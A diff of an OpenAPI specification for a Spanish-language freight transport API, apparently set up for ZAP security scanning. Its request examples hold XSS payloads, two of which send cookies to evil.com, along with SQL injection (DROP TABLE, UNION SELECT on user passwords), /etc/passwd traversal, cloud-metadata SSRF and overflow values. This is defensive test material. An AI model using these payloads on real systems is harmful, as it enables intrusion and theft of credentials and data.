@@ -5,7 +5,17 @@ info:
     API de gestión de transporte de carga pesada.
     Roles: ADMIN, GERENTE, CHOFER.
     Auth: Bearer token desde POST /auth/login.
-  version: "1.0.0"
+    
+    Endpoints no documentados oficialmente pero presentes en el código:
+    - /alertas/* (6 endpoints)
+    - /jornadas/historial-gerencial (2 endpoints)
+    - /jornadas/alerta/{jornadaId}
+    - /conductores/{id}/estadisticas
+    - /conductores/dashboard/resumen
+    - /conductores/dashboard/listado
+    - PUT /contratos/{id}
+    - PUT /contratos/{id}/unidades
+  version: "2.0.0"
 
 servers:
   - url: "API_URL_PLACEHOLDER"
@@ -35,11 +45,16 @@ components:
         modelo: { type: string, example: "FH16" }
         anio: { type: integer, minimum: 1990, maximum: 2027, example: 2023 }
         capacidad_ton: { type: number, minimum: 0.1, example: 20.0 }
-        vin: { type: string, example: "VINZAP0000001" }
+        vin: { type: string, minLength: 13, example: "VINZAP0000001" }
         color: { type: string, example: "Blanco" }
-        combustible: { type: string, enum: [DIESEL, GASOLINA, GNV, GLP, ELECTRICO, HIBRIDO], example: "DIESEL" }
+        combustible:
+          type: string
+          enum: [DIESEL, GASOLINA, GNV, GLP, ELECTRICO, HIBRIDO]
+          example: "DIESEL"
         gps: { type: boolean, example: true }
-        estado: { type: string, enum: [DISPONIBLE, EN_JORNADA, EN_AUXILIO, MANTENIMIENTO, INACTIVA] }
+        estado:
+          type: string
+          enum: [DISPONIBLE, EN_JORNADA, EN_AUXILIO, MANTENIMIENTO, INACTIVA]
         kilometraje_actual: { type: number, example: 0 }
         notas: { type: string, example: "Unidad nueva" }
 
@@ -48,28 +63,138 @@ components:
       required: [conductor_id, unidad_id, contrato_id, fecha_jornada, origen, destino, km_estimados]
       properties:
         conductor_id: { type: string, format: uuid, example: "22222222-2222-2222-2222-222222222222" }
-        unidad_id: { type: string, format: uuid, example: "aaaa0001-0000-0000-0000-000000000001" }
+        unidad_id: { type: string, format: uuid, example: "aaaa0003-0000-0000-0000-000000000003" }
         contrato_id: { type: string, format: uuid, example: "bbbb0001-0000-0000-0000-000000000001" }
-        fecha_jornada: { type: string, format: date, example: "2026-05-21" }
+        creado_por: { type: string, format: uuid, example: "11111111-1111-1111-1111-111111111111" }
+        fecha_jornada: { type: string, format: date, example: "2026-06-01" }
         origen: { type: string, example: "Lima" }
         destino: { type: string, example: "Arequipa" }
         km_estimados: { type: number, example: 520 }
         tipo_carga: { type: string, example: "Mineral concentrado" }
         peso_carga_ton: { type: number, example: 18.5 }
+        observaciones: { type: string, example: "Sin novedades" }
 
     CreateContratoRequest:
       type: object
-      required: [codigo, cliente, tipo_servicio, fecha_inicio]
+      required: [cliente, ruc, tipo_servicio, fecha_inicio, origen, destino, distancia_estimada_km, tarifa_por_km]
       properties:
-        codigo: { type: string, example: "CONT-ZAP-001" }
         cliente: { type: string, example: "Empresa Test SA" }
-        ruc: { type: string, example: "20123456799" }
-        descripcion: { type: string, example: "Contrato de prueba" }
-        tipo_servicio: { type: string, enum: [POR_VIAJE, POR_HORA, POR_TONELADA, POR_KM, MENSUAL] }
+        ruc: { type: string, pattern: '^\d{11}$', example: "20123456799" }
+        descripcion: { type: string, example: "Contrato de prueba ZAP" }
+        tipo_servicio:
+          type: string
+          enum: [POR_VIAJE, POR_HORA, POR_TONELADA, POR_KM, MENSUAL]
+          example: "POR_VIAJE"
+        fecha_inicio: { type: string, format: date, example: "2026-06-01" }
+        fecha_fin: { type: string, format: date, example: "2026-12-31" }
+        origen: { type: string, example: "Lima" }
+        destino: { type: string, example: "Arequipa" }
+        distancia_estimada_km: { type: number, example: 520 }
+        tarifa_por_km: { type: number, example: 5.50 }
+        tarifa_por_hora: { type: number, example: 0 }
+        tarifa_espera: { type: number, example: 0 }
+        moneda: { type: string, example: "PEN" }
+
+    UpdateContratoRequest:
+      type: object
+      properties:
         fecha_inicio: { type: string, format: date, example: "2026-01-01" }
         fecha_fin: { type: string, format: date, example: "2026-12-31" }
+        tipo_servicio:
+          type: string
+          enum: [POR_VIAJE, POR_HORA, POR_TONELADA, POR_KM, MENSUAL]
+        descripcion: { type: string, example: "Descripción actualizada" }
         tarifa: { type: number, example: 15000 }
-        moneda: { type: string, example: "PEN" }
+        tarifas:
+          type: object
+          properties:
+            base: { type: number, example: 5000 }
+            hora: { type: number, example: 450 }
+            tonelada: { type: number, example: 180 }
+
+    AssignUnidadesRequest:
+      type: object
+      required: [unidades]
+      properties:
+        unidades:
+          type: array
+          items: { type: string, format: uuid }
+          example: ["aaaa0001-0000-0000-0000-000000000001"]
+
+    IniciarJornadaRequest:
+      type: object
+      required: [jornada_id]
+      properties:
+        jornada_id: { type: string, format: uuid, example: "cccc0003-0000-0000-0000-000000000003" }
+
+    FinalizarJornadaRequest:
+      type: object
+      required: [jornada_id]
+      properties:
+        jornada_id: { type: string, format: uuid, example: "cccc0002-0000-0000-0000-000000000002" }
+        km_recorridos: { type: number, example: 300 }
+        observaciones: { type: string, example: "Sin incidencias" }
+
+    RegisterSosRequest:
+      type: object
+      required: [jornada_id, conductor_id, latitud, longitud]
+      properties:
+        jornada_id: { type: string, format: uuid, example: "cccc0002-0000-0000-0000-000000000002" }
+        conductor_id: { type: string, format: uuid, example: "33333333-3333-3333-3333-333333333333" }
+        latitud: { type: number, example: -12.0464 }
+        longitud: { type: number, example: -77.0428 }
+        direccion: { type: string, example: "Lima Centro" }
+        detalle: { type: string, example: "SOS activado" }
+        timestamp_local: { type: string, example: "2026-05-23T10:00:00" }
+        created_offline: { type: boolean, example: false }
+        event_id_cliente: { type: string, example: "SOS-LOCAL-001" }
+
+    RegisterAuxilioRequest:
+      type: object
+      required: [jornada_id, conductor_id, tipo_falla_mecanica, latitud, longitud]
+      properties:
+        jornada_id: { type: string, format: uuid, example: "cccc0002-0000-0000-0000-000000000002" }
+        conductor_id: { type: string, format: uuid, example: "33333333-3333-3333-3333-333333333333" }
+        tipo_falla_mecanica:
+          type: string
+          enum: ["Falla de Motor", "Pinchazo/Llantas", "Fallo en frenos", "Problema eléctrico", "Falta de combustible", "Problema de transmisión", "Otro"]
+          example: "Pinchazo/Llantas"
+        latitud: { type: number, example: -12.0464 }
+        longitud: { type: number, example: -77.0428 }
+        direccion: { type: string, example: "Lima Centro" }
+        detalle: { type: string, example: "Llanta delantera derecha" }
+        timestamp_local: { type: string, example: "2026-05-23T10:00:00" }
+        created_offline: { type: boolean, example: false }
+        event_id_cliente: { type: string, example: "AUX-LOCAL-001" }
+
+    ResolverAlertaRequest:
+      type: object
+      properties:
+        detalle_resolucion: { type: string, example: "Alerta atendida y cerrada" }
+        servicio_tecnico_realizado: { type: string, example: "No aplica" }
+
+    ActualizarEstadoAlertaRequest:
+      type: object
+      required: [estado]
+      properties:
+        estado:
+          type: string
+          enum: [EN_PROCESO, RESUELTA]
+          example: "EN_PROCESO"
+
+    GpsImportRequest:
+      type: object
+      required: [proveedor, nombre_archivo, csv]
+      properties:
+        proveedor:
+          type: string
+          enum: [GPSCONTROL, GLOBALGPS]
+          example: "GPSCONTROL"
+        nombre_archivo: { type: string, example: "tracking.csv" }
+        csv:
+          type: string
+          example: "fecha,hora,placa,latitud,longitud,velocidad,rumbo,distancia_total\n2026-05-01,08:00:00,ABC-123,-12.0464,-77.0428,60,180,1000"
+        cargado_por: { type: string, format: uuid, example: "11111111-1111-1111-1111-111111111111" }
 
     ErrorResponse:
       type: object
@@ -97,6 +222,9 @@ security:
 
 paths:
 
+  # =========================================================
+  # AUTH
+  # =========================================================
   /auth/login:
     post:
       summary: Iniciar sesión (público)
@@ -122,6 +250,8 @@ paths:
                 value: { email: "<script>alert(document.cookie)</script>@x.com", password: "test" }
               zap_xss_svg:
                 value: { email: "<svg/onload=alert(1)>@x.com", password: "test" }
+              zap_overflow:
+                value: { email: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@x.com", password: "x" }
       responses:
         '200': { description: Login exitoso }
         '400': { description: Datos inválidos }
@@ -163,12 +293,13 @@ paths:
               type: object
               required: [email, code, newPassword]
               properties:
-                email: { type: string, format: email, example: admin@nanutech.com }
+                email: { type: string, format: email }
                 code: { type: string, example: "123456" }
                 newPassword: { type: string, example: "NuevoPass123!" }
             examples:
               valido: { value: { email: "admin@nanutech.com", code: "123456", newPassword: "NuevoPass123!" } }
               zap_sqli: { value: { email: "admin@nanutech.com", code: "' OR '1'='1", newPassword: "x" } }
+              zap_xss: { value: { email: "admin@nanutech.com", code: "123456", newPassword: "<script>alert(1)</script>" } }
       responses:
         '200': { description: Contraseña actualizada }
         '401': { description: Código inválido }
@@ -182,6 +313,9 @@ paths:
         '200': { description: Datos del usuario autenticado }
         '401': { $ref: '#/components/responses/Unauthorized' }
 
+  # =========================================================
+  # CAMIONES — solo ADMIN
+  # =========================================================
   /camiones:
     get:
       summary: Listar camiones (solo ADMIN)
@@ -198,7 +332,9 @@ paths:
             zap_traversal: { value: "../../../etc/passwd" }
         - name: estado
           in: query
-          schema: { type: string, enum: [DISPONIBLE, EN_JORNADA, EN_AUXILIO, MANTENIMIENTO, INACTIVA, TODOS] }
+          schema:
+            type: string
+            enum: [DISPONIBLE, EN_JORNADA, EN_AUXILIO, MANTENIMIENTO, INACTIVA, TODOS]
       responses:
         '200': { description: Lista de camiones }
         '401': { $ref: '#/components/responses/Unauthorized' }
@@ -216,15 +352,17 @@ paths:
               valido:
                 value: { placa: "ZAP-001", marca: "Volvo", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINZAP0000001", color: "Blanco", combustible: "DIESEL", gps: true }
               zap_sqli_placa:
-                value: { placa: "'; DROP TABLE unidades; --", marca: "Test", modelo: "Test", anio: 2023, capacidad_ton: 10, vin: "VIN1234567890", color: "Rojo", combustible: "DIESEL", gps: false }
+                value: { placa: "'; DROP TABLE unidades; --", marca: "Test", modelo: "Test", anio: 2023, capacidad_ton: 10, vin: "VIN1234567890AB", color: "Rojo", combustible: "DIESEL", gps: false }
               zap_sqli_vin:
-                value: { placa: "ZAP-002", marca: "Test", modelo: "Test", anio: 2023, capacidad_ton: 10, vin: "' OR '1'='1", color: "Rojo", combustible: "DIESEL", gps: false }
+                value: { placa: "ZAP-002", marca: "Test", modelo: "Test", anio: 2023, capacidad_ton: 10, vin: "' OR '1'='1'--AB", color: "Rojo", combustible: "DIESEL", gps: false }
               zap_xss_marca:
-                value: { placa: "ZAP-XSS1", marca: "<img src=x onerror=alert(document.cookie)>", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINXSS00001", color: "Azul", combustible: "DIESEL", gps: true }
+                value: { placa: "ZAP-XSS1", marca: "<img src=x onerror=alert(document.cookie)>", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINXSS000000001", color: "Azul", combustible: "DIESEL", gps: true }
               zap_xss_notas:
-                value: { placa: "ZAP-XSS2", marca: "Volvo", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINXSS00002", color: "Negro", combustible: "DIESEL", gps: true, notas: "<script>fetch('https://evil.com?c='+document.cookie)</script>" }
+                value: { placa: "ZAP-XSS2", marca: "Volvo", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINXSS000000002", color: "Negro", combustible: "DIESEL", gps: true, notas: "<script>fetch('https://evil.com?c='+document.cookie)</script>" }
               zap_ssrf:
-                value: { placa: "ZAP-SSRF", marca: "Volvo", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINSSRF0001", color: "Blanco", combustible: "DIESEL", gps: true, notas: "http://169.254.169.254/latest/meta-data/" }
+                value: { placa: "ZAP-SSRF", marca: "Volvo", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINSSRF00000001", color: "Blanco", combustible: "DIESEL", gps: true, notas: "http://169.254.169.254/latest/meta-data/" }
+              zap_overflow_anio:
+                value: { placa: "ZAP-OVF1", marca: "Volvo", modelo: "FH16", anio: 99999999999999999999999999999999999999999999, capacidad_ton: 20, vin: "VINOVF000000001", color: "Blanco", combustible: "DIESEL", gps: true }
       responses:
         '201': { description: Camión creado }
         '400': { description: Error de validación }
@@ -246,6 +384,7 @@ paths:
             zap_sqli_union: { value: "1 UNION SELECT correo,password,rol,4,5,6,7,8,9,10 FROM usuarios--" }
             zap_traversal: { value: "../../etc/passwd" }
             zap_xss: { value: "<script>alert(1)</script>" }
+            zap_overflow: { value: "99999999999999999999999999999999999999999999" }
       responses:
         '200': { description: Detalle del camión }
         '401': { $ref: '#/components/responses/Unauthorized' }
@@ -263,6 +402,7 @@ paths:
           examples:
             normal: { value: "ABC" }
             zap_sqli: { value: "' OR '1'='1" }
+            zap_xss: { value: "<script>alert(1)</script>" }
         - name: estado
           in: query
           schema: { type: string, enum: [DISPONIBLE, EN_JORNADA, MANTENIMIENTO, TODOS] }
@@ -291,6 +431,9 @@ paths:
         '401': { $ref: '#/components/responses/Unauthorized' }
         '403': { $ref: '#/components/responses/Forbidden' }
 
+  # =========================================================
+  # DASHBOARD
+  # =========================================================
   /dashboard:
     get:
       summary: Dashboard admin (solo ADMIN)
@@ -302,231 +445,28 @@ paths:
 
   /dashboard/gerencial:
     get:
-      summary: Dashboard gerencial (solo GERENTE)
+      summary: Dashboard gerencial (GERENTE y ADMIN según código)
       tags: [Dashboard]
+      parameters:
+        - name: tiempo
+          in: query
+          schema: { type: string, enum: [hoy, semana, mes, todas] }
+          example: "todas"
+        - name: search
+          in: query
+          schema: { type: string }
+          examples:
+            normal: { value: "ABC" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_xss: { value: "<script>alert(1)</script>" }
       responses:
         '200': { description: Datos gerenciales }
         '401': { $ref: '#/components/responses/Unauthorized' }
         '403': { $ref: '#/components/responses/Forbidden' }
 
-  /jornadas:
-    get:
-      summary: Listar jornadas (ADMIN, GERENTE)
-      tags: [Jornadas]
-      parameters:
-        - name: estado
-          in: query
-          schema: { type: string, enum: [REGISTRADA, PENDIENTE, EN_PROCESO, COMPLETADA, CANCELADA] }
-        - name: fecha_jornada
-          in: query
-          schema: { type: string, format: date, example: "2026-05-21" }
-      responses:
-        '200': { description: Lista de jornadas }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-
-    post:
-      summary: Crear jornada (ADMIN, GERENTE)
-      tags: [Jornadas]
-      requestBody:
-        required: true
-        content:
-          application/json:
-            schema: { $ref: '#/components/schemas/CreateJornadaRequest' }
-            examples:
-              valido:
-                value: { conductor_id: "22222222-2222-2222-2222-222222222222", unidad_id: "aaaa0001-0000-0000-0000-000000000001", contrato_id: "bbbb0001-0000-0000-0000-000000000001", fecha_jornada: "2026-05-21", origen: "Lima", destino: "Arequipa", km_estimados: 520 }
-              zap_xss_origen:
-                value: { conductor_id: "22222222-2222-2222-2222-222222222222", unidad_id: "aaaa0001-0000-0000-0000-000000000001", contrato_id: "bbbb0001-0000-0000-0000-000000000001", fecha_jornada: "2026-05-21", origen: "<script>alert(1)</script>", destino: "Arequipa", km_estimados: 520 }
-              zap_xss_destino:
-                value: { conductor_id: "22222222-2222-2222-2222-222222222222", unidad_id: "aaaa0001-0000-0000-0000-000000000001", contrato_id: "bbbb0001-0000-0000-0000-000000000001", fecha_jornada: "2026-05-21", origen: "Lima", destino: "<img src=x onerror=alert(document.cookie)>", km_estimados: 520 }
-              zap_sqli:
-                value: { conductor_id: "' OR '1'='1", unidad_id: "aaaa0001-0000-0000-0000-000000000001", contrato_id: "bbbb0001-0000-0000-0000-000000000001", fecha_jornada: "2026-05-21", origen: "Lima", destino: "Arequipa", km_estimados: 520 }
-      responses:
-        '201': { description: Jornada creada }
-        '400': { description: Error de validación }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-
-  /jornadas/actual/{conductorId}:
-    get:
-      summary: Jornada actual del conductor (solo CHOFER)
-      tags: [Jornadas]
-      parameters:
-        - name: conductorId
-          in: path
-          required: true
-          schema: { type: string, format: uuid }
-          examples:
-            valido: { value: "22222222-2222-2222-2222-222222222222" }
-            zap_sqli: { value: "' OR '1'='1" }
-            zap_traversal: { value: "../../etc/passwd" }
-      responses:
-        '200': { description: Jornada actual }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-        '404': { description: Sin jornada activa }
-
-  /jornadas/iniciar:
-    post:
-      summary: Iniciar jornada (solo CHOFER)
-      tags: [Jornadas]
-      requestBody:
-        required: true
-        content:
-          application/json:
-            schema:
-              type: object
-              required: [jornada_id]
-              properties:
-                jornada_id: { type: string, format: uuid, example: "cccc0002-0000-0000-0000-000000000002" }
-            examples:
-              valido: { value: { jornada_id: "cccc0002-0000-0000-0000-000000000002" } }
-              zap_sqli: { value: { jornada_id: "' OR '1'='1" } }
-      responses:
-        '200': { description: Jornada iniciada }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-
-  /jornadas/finalizar:
-    post:
-      summary: Finalizar jornada (solo CHOFER)
-      tags: [Jornadas]
-      requestBody:
-        required: true
-        content:
-          application/json:
-            schema:
-              type: object
-              required: [jornada_id]
-              properties:
-                jornada_id: { type: string, format: uuid, example: "cccc0002-0000-0000-0000-000000000002" }
-                km_recorridos: { type: number, example: 300 }
-                observaciones: { type: string, example: "Sin incidencias" }
-            examples:
-              valido: { value: { jornada_id: "cccc0002-0000-0000-0000-000000000002", km_recorridos: 300, observaciones: "Sin incidencias" } }
-              zap_xss: { value: { jornada_id: "cccc0002-0000-0000-0000-000000000002", km_recorridos: 300, observaciones: "<script>alert(document.cookie)</script>" } }
-              zap_sqli: { value: { jornada_id: "' OR '1'='1", km_recorridos: 0, observaciones: "test" } }
-      responses:
-        '200': { description: Jornada finalizada }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-
-  /jornadas/exportar:
-    get:
-      summary: Exportar jornadas (ADMIN, GERENTE)
-      tags: [Jornadas]
-      responses:
-        '200': { description: Exportación de jornadas }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-
-  /gps/proveedores:
-    get:
-      summary: Proveedores GPS (solo ADMIN)
-      tags: [GPS]
-      responses:
-        '200': { description: Lista de proveedores }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-
-  /gps/plantilla:
-    get:
-      summary: Plantilla GPS genérica (solo ADMIN)
-      tags: [GPS]
-      responses:
-        '200': { description: Plantilla CSV/XLSX }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-
-  /gps/plantilla/{proveedor}:
-    get:
-      summary: Plantilla GPS por proveedor (solo ADMIN)
-      tags: [GPS]
-      parameters:
-        - name: proveedor
-          in: path
-          required: true
-          schema: { type: string, enum: [GPSCONTROL, GLOBALGPS, OTRO] }
-          examples:
-            valido: { value: "GPSCONTROL" }
-            zap_traversal: { value: "GPSCONTROL/../../../etc/passwd" }
-            zap_sqli: { value: "' OR '1'='1" }
-      responses:
-        '200': { description: Plantilla del proveedor }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-
-  /gps/validar:
-    post:
-      summary: Validar archivo GPS (solo ADMIN)
-      tags: [GPS]
-      requestBody:
-        required: true
-        content:
-          application/json:
-            schema:
-              type: object
-              properties:
-                proveedor: { type: string, enum: [GPSCONTROL, GLOBALGPS, OTRO] }
-            examples:
-              valido: { value: { proveedor: "GPSCONTROL" } }
-              zap_sqli: { value: { proveedor: "' OR '1'='1" } }
-      responses:
-        '200': { description: Resultado de validación }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-
-  /gps/importar:
-    post:
-      summary: Importar GPS (solo ADMIN)
-      tags: [GPS]
-      requestBody:
-        required: true
-        content:
-          application/json:
-            schema:
-              type: object
-              properties:
-                proveedor: { type: string, enum: [GPSCONTROL, GLOBALGPS, OTRO] }
-            examples:
-              valido: { value: { proveedor: "GPSCONTROL" } }
-      responses:
-        '200': { description: Importación procesada }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-
-  /gps/resumen:
-    get:
-      summary: Resumen GPS (solo ADMIN)
-      tags: [GPS]
-      responses:
-        '200': { description: Resumen GPS }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-
-  /gps/registros:
-    get:
-      summary: Registros GPS (solo ADMIN)
-      tags: [GPS]
-      parameters:
-        - name: unidad_id
-          in: query
-          schema: { type: string, format: uuid }
-          examples:
-            valido: { value: "aaaa0001-0000-0000-0000-000000000001" }
-            zap_sqli: { value: "' OR '1'='1" }
-        - name: fecha_inicio
-          in: query
-          schema: { type: string, format: date, example: "2026-04-01" }
-        - name: fecha_fin
-          in: query
-          schema: { type: string, format: date, example: "2026-05-21" }
-      responses:
-        '200': { description: Lista de registros GPS }
-        '401': { $ref: '#/components/responses/Unauthorized' }
-        '403': { $ref: '#/components/responses/Forbidden' }
-
+  # =========================================================
+  # CONDUCTORES — ADMIN y GERENTE
+  # =========================================================
   /conductores:
     get:
       summary: Listar conductores (ADMIN, GERENTE)
@@ -536,10 +476,88 @@ paths:
         '401': { $ref: '#/components/responses/Unauthorized' }
         '403': { $ref: '#/components/responses/Forbidden' }
 
+  /conductores/{id}/estadisticas:
+    get:
+      summary: Estadísticas de conductor (ADMIN, GERENTE) — no documentado oficialmente
+      tags: [Conductores]
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string, format: uuid }
+          examples:
+            valido: { value: "22222222-2222-2222-2222-222222222222" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_traversal: { value: "../../etc/passwd" }
+            zap_overflow: { value: "99999999999999999999999999999999999999999999" }
+      responses:
+        '200': { description: Estadísticas del conductor }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+        '404': { description: Conductor no encontrado }
+
+  /conductores/dashboard/resumen:
+    get:
+      summary: Resumen dashboard conductores (solo ADMIN) — no documentado oficialmente
+      tags: [Conductores]
+      responses:
+        '200': { description: Indicadores y gráficos del dashboard de conductores }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /conductores/dashboard/listado:
+    get:
+      summary: Listado paginado conductores (solo ADMIN) — no documentado oficialmente
+      tags: [Conductores]
+      parameters:
+        - name: busqueda
+          in: query
+          schema: { type: string }
+          examples:
+            normal: { value: "Carlos" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_xss: { value: "<script>alert(1)</script>" }
+        - name: estado
+          in: query
+          schema: { type: string, enum: [ACTIVOS, INACTIVOS, TODOS] }
+        - name: disponibilidad
+          in: query
+          schema: { type: string, enum: [DISPONIBLE, EN_RUTA, DESCANSO, TODOS] }
+        - name: page
+          in: query
+          schema: { type: integer, example: 1 }
+        - name: limit
+          in: query
+          schema: { type: integer, example: 20 }
+      responses:
+        '200': { description: Listado paginado de conductores }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  # =========================================================
+  # CONTRATOS
+  # =========================================================
   /contratos:
     get:
       summary: Listar contratos (solo GERENTE)
       tags: [Contratos]
+      parameters:
+        - name: q
+          in: query
+          schema: { type: string }
+          examples:
+            normal: { value: "Minera" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_xss: { value: "<script>alert(1)</script>" }
+        - name: estado
+          in: query
+          schema: { type: string, enum: [VIGENTE, VENCIDO, SUSPENDIDO, INACTIVO] }
+        - name: page
+          in: query
+          schema: { type: integer, example: 1 }
+        - name: limit
+          in: query
+          schema: { type: integer, example: 10 }
       responses:
         '200': { description: Lista de contratos }
         '401': { $ref: '#/components/responses/Unauthorized' }
@@ -555,18 +573,58 @@ paths:
             schema: { $ref: '#/components/schemas/CreateContratoRequest' }
             examples:
               valido:
-                value: { codigo: "CONT-ZAP-001", cliente: "Empresa Test SA", ruc: "20123456799", tipo_servicio: "POR_VIAJE", fecha_inicio: "2026-01-01", tarifa: 15000, moneda: "PEN" }
+                value:
+                  cliente: "Empresa Test SA"
+                  ruc: "20123456799"
+                  tipo_servicio: "POR_VIAJE"
+                  fecha_inicio: "2026-06-01"
+                  fecha_fin: "2026-12-31"
+                  origen: "Lima"
+                  destino: "Arequipa"
+                  distancia_estimada_km: 520
+                  tarifa_por_km: 5.50
+                  moneda: "PEN"
               zap_xss_cliente:
-                value: { codigo: "CONT-XSS-001", cliente: "<script>alert(document.cookie)</script>", tipo_servicio: "POR_VIAJE", fecha_inicio: "2026-01-01" }
-              zap_xss_descripcion:
-                value: { codigo: "CONT-XSS-002", cliente: "Test", descripcion: "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>", tipo_servicio: "POR_VIAJE", fecha_inicio: "2026-01-01" }
-              zap_sqli_codigo:
-                value: { codigo: "' OR '1'='1", cliente: "Test", tipo_servicio: "POR_VIAJE", fecha_inicio: "2026-01-01" }
+                value:
+                  cliente: "<script>alert(document.cookie)</script>"
+                  ruc: "20123456799"
+                  tipo_servicio: "POR_VIAJE"
+                  fecha_inicio: "2026-06-01"
+                  origen: "Lima"
+                  destino: "Arequipa"
+                  distancia_estimada_km: 520
+                  tarifa_por_km: 5.50
               zap_sqli_cliente:
-                value: { codigo: "CONT-SQLI-001", cliente: "' UNION SELECT correo,password FROM usuarios--", tipo_servicio: "POR_VIAJE", fecha_inicio: "2026-01-01" }
+                value:
+                  cliente: "' UNION SELECT correo,password FROM usuarios--"
+                  ruc: "20123456799"
+                  tipo_servicio: "POR_VIAJE"
+                  fecha_inicio: "2026-06-01"
+                  origen: "Lima"
+                  destino: "Arequipa"
+                  distancia_estimada_km: 520
+                  tarifa_por_km: 5.50
       responses:
         '201': { description: Contrato creado }
         '400': { description: Error de validación }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /contratos/indicadores:
+    get:
+      summary: Indicadores de contratos (solo GERENTE)
+      tags: [Contratos]
+      responses:
+        '200': { description: KPIs de contratos }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /contratos/vigentes:
+    get:
+      summary: Contratos vigentes (ADMIN, GERENTE)
+      tags: [Contratos]
+      responses:
+        '200': { description: Contratos activos }
         '401': { $ref: '#/components/responses/Unauthorized' }
         '403': { $ref: '#/components/responses/Forbidden' }
 
@@ -589,24 +647,74 @@ paths:
         '403': { $ref: '#/components/responses/Forbidden' }
         '404': { description: No encontrado }
 
-  /contratos/indicadores:
-    get:
-      summary: Indicadores de contratos (solo GERENTE)
+    put:
+      summary: Actualizar contrato (solo GERENTE) — no documentado oficialmente
       tags: [Contratos]
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string, format: uuid }
+          examples:
+            valido: { value: "bbbb0001-0000-0000-0000-000000000001" }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/UpdateContratoRequest' }
+            examples:
+              valido:
+                value:
+                  fecha_inicio: "2026-01-01"
+                  fecha_fin: "2026-12-31"
+                  tipo_servicio: "POR_VIAJE"
+                  descripcion: "Actualizado por ZAP"
+                  tarifa: 15000
+              zap_xss_descripcion:
+                value:
+                  descripcion: "<script>alert(document.cookie)</script>"
+                  tarifa: 15000
+              zap_sqli_tarifa:
+                value:
+                  descripcion: "' OR '1'='1"
+                  tarifa: 0
       responses:
-        '200': { description: KPIs de contratos }
+        '200': { description: Contrato actualizado }
+        '400': { description: Error de validación }
         '401': { $ref: '#/components/responses/Unauthorized' }
         '403': { $ref: '#/components/responses/Forbidden' }
 
-  /contratos/vigentes:
-    get:
-      summary: Contratos vigentes (ADMIN, GERENTE)
+  /contratos/{id}/unidades:
+    put:
+      summary: Asignar unidades a contrato (solo GERENTE) — no documentado oficialmente
       tags: [Contratos]
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string, format: uuid }
+          examples:
+            valido: { value: "bbbb0001-0000-0000-0000-000000000001" }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/AssignUnidadesRequest' }
+            examples:
+              valido:
+                value: { unidades: ["aaaa0001-0000-0000-0000-000000000001"] }
+              zap_sqli:
+                value: { unidades: ["' OR '1'='1"] }
+              zap_vacio:
+                value: { unidades: [] }
       responses:
-        '200': { description: Contratos activos }
+        '200': { description: Unidades asignadas }
         '401': { $ref: '#/components/responses/Unauthorized' }
         '403': { $ref: '#/components/responses/Forbidden' }
 
+  # =========================================================
+  # UNIDADES — ADMIN y GERENTE
+  # =========================================================
   /unidades/disponibles:
     get:
       summary: Unidades disponibles (ADMIN, GERENTE)
@@ -615,3 +723,542 @@ paths:
         '200': { description: Unidades con estado DISPONIBLE }
         '401': { $ref: '#/components/responses/Unauthorized' }
         '403': { $ref: '#/components/responses/Forbidden' }
+
+  # =========================================================
+  # GPS — solo ADMIN
+  # =========================================================
+  /gps/proveedores:
+    get:
+      summary: Proveedores GPS soportados (solo ADMIN)
+      tags: [GPS]
+      responses:
